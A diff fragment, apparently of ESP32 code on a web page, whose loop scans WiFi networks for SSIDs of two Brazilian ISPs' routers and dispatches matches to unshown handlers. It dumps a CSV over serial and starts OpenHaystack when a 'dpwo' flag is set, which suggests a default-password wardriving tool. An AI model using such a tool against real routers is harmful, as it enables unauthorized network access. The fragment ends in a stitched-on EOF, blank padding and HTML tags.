+void loop()
+{
+    WiFi.mode(WIFI_STA);
+    std::regex net_regex("NET_.*");
+    std::regex claro_regex("CLARO_.*");
+
+    for (int i = 0; i < num_rede; ++i)
+    {
+        if (std::regex_search(WiFi.SSID(i).c_str(), claro_regex))
+        {
+            claro(i);
+        } else if (std::regex_search(WiFi.SSID(i).c_str(), net_regex))
+        {
+            net(i);
+        } else {
+        }
+    }
+    num_rede = WiFi.scanNetworks();
+
+    //para poder copiar pelo serial
+    readFile(LittleFS, "/a.csv");
+
+    if(achou_dpwo)
+    {
+      openhaystack_setup();
+      achou_dpwo=false;
+    }
+}
+
+EOF
+                                                                                
+                                                                                
+                                                                                
+                                                                                
+                                                                                
+                                                                                
+                                                                                
+                                                                                
+                                                                                
+                                                                
+
+</div></pre>
+</body>
+</html>
